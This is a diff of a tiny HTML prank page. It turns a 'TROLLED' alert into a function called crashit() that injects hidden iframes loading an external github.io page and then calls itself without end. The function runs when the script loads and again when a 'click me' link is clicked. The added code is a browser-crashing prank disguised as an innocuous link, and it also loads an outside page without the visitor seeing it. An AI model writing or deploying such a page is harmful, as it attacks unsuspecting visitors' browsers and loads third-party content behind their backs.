@@ -1,9 +1,14 @@
+
 <!DOCTYPE html>
 <html>
  <head>
  <script>
+  crashit();
   function crashit() {
-   alrert("TROLLED");
+   const iframe = document.createElement("iframe");
+iframe.style.display = "none";
+iframe.src = "https://wafflesj.github.io/Uhh/";
+document.body.appendChild(iframe);
    crashit();
    crashit();
    crashit();
@@ -12,6 +17,6 @@
  </script>
  </head>
  <body>
-     <a onclick="alert('test');">click me</a>
+     <a onclick="crashit();">click me</a>
  </body>
 </html>
